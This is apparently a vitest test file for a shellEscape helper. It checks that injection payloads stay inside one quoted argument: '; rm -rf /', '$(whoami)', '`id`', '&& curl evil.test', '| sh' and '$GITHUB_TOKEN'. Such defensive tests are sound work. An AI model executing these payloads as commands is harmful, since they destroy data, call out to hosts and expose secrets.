import { describe, expect, it } from "vitest";
import { shellEscape } from "../app/shell/index.js";

describe("shellEscape", () => {
	it("wraps a plain value in single quotes", () => {
		expect(shellEscape("main")).toBe("'main'");
	});

	it("neutralizes an embedded single quote", () => {
		expect(shellEscape("it's")).toBe("'it'\\''s'");
	});

	// Every one of these would otherwise be a command injection, since the
	// values interpolated into commands come from model output, branch names,
	// file paths, and issue titles.
	it.each([
		"; rm -rf /",
		"$(whoami)",
		"`id`",
		"&& curl evil.test",
		"| sh",
		"a\nb",
		"$GITHUB_TOKEN",
	])("contains %s inside one quoted argument", (value) => {
		const escaped = shellEscape(value);
		expect(escaped.startsWith("'")).toBe(true);
		expect(escaped.endsWith("'")).toBe(true);
		// The payload survives verbatim; it is quoted, not stripped.
		expect(escaped.slice(1, -1)).toBe(value);
	});
});
